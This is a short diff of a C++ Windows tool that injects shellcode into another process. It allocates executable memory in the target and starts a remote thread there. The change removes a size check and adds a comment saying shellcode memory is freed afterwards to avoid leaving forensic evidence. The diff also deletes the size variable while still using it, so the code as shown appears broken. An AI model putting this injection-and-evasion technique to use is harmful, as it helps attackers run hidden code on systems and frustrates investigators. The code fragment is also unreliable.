@@ -56,13 +56,6 @@ int wmain(int argc, PWCHAR argv[])
 			+ StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remoteParamsMemoryGuard.get())));
 
 
-		const int picBytesSize = reinterpret_cast<LPBYTE>(endPic) - reinterpret_cast<LPBYTE>(startPic);
-		if (0 >= picBytesSize)
-		{
-			throw std::runtime_error("Invalid PIC size");
-		}
-
-
 		VirtualAllocExGuard remotePicMemoryGuard(targetProcess.get(), picBytesSize, PAGE_EXECUTE_READWRITE);
 		DEBUG_PRINT("[+] Allocate memory for PIC in target process");
 
@@ -83,12 +76,16 @@ int wmain(int argc, PWCHAR argv[])
 		DEBUG_PRINT("[+] Create remote thread in target process TID=" + StringUtils::hexValue(threadId));
 
 
-		// The injection succeeded, so we don't want to destroy the memory:
-		remoteParamsMemoryGuard.release();
-		remotePicMemoryGuard.release();
-
-
 		WaitForSingleObject(targetThread.get(), INFINITE);
+
+		/*
+		 * VirtualAllocExGuard get called automatically in order to release
+		 * shellcode memory and avoid forensics evidence.
+		 * If you want to keep the remote allocation after the injection add:
+			remoteParamsMemoryGuard.release();
+			remotePicMemoryGuard.release();
+		* so we don't want to destroy the memory.
+		*/
 	}
 	catch (std::exception& exception)
 	{
